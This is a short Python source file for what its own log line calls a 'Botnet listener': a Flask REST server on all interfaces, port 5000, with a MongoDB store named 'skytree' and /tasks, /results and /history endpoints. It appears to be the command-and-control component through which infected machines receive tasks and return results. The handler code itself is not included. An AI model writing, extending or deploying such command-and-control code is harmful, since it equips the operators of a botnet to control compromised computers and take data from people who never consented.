import json
import resources
import threading

from flask import Flask
import logging
from flask_restful import Api
from database.db import initialize_db

class Listener_HTTP(threading.Thread):
    def run(self):
        # Flask app initialization
        app = Flask(__name__)
        # Configure our database on localhost
        app.config['MONGODB_SETTINGS'] = {
            'host': 'mongodb://localhost/skytree'
        }
        # Initialize our database
        initialize_db(app)

        api = Api(app)

        # Define the routes for each of our resources
        api.add_resource(resources.Tasks, '/tasks', endpoint='tasks')
        api.add_resource(resources.Results, '/results')
        api.add_resource(resources.History, '/history')

        # Disable Flask's default logger
        #log = logging.getLogger('werkzeug')
        #log.disabled = True
        #app.logger.disabled = True

        print(f"[* Listener-Msg] Starting Botnet listener on http://0.0.0.0:5000\n")
        app.run(host="0.0.0.0", port=5000)